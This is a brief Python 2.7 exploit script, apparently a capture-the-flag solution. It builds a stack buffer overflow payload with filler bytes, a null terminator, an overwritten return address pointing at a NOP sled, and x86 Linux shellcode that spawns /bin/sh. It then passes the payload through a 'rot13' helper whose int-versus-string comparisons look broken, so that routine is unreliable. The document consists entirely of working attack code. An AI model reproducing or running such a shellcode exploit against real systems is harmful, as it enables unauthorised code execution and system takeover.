#!/usr/bin/python2.7
import struct

payload = ""

shellcode = "\x90\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

def pack(p):
    return struct.pack('<I', p)

null = chr(0x00)
nop = chr(0x90)

# Fills up buffer
payload += 'A' * 255

# Modifying stack
payload += null # null terminator to get past strlen(tmp)
payload += 'A'*12 # 3 sets of 4 bytes to get to the $eip
payload += pack(0x804a060 + 10) # modify $eip to point to tmp+10 which will be in the middle of the NOP SLED later on
payload += nop*(253-12-4) # weeeeee NOP SLED.

# Shellcode to pop the shell
payload += nop*(255-len(shellcode)) + shellcode

def prepare_rot13(payload):
    temp = []
    for c in payload:
        if c != "\n":
            c = ord(c)
            if ((c >= 'a' and c < 'a'+13) or (c >= 'A' and c < 'A'+13)):
                c -= 26;
            c += 13
            temp.append(chr(c))
        else:
            temp.append(c)
    return ''.join(temp)

print prepare_rot13(payload) + "\n"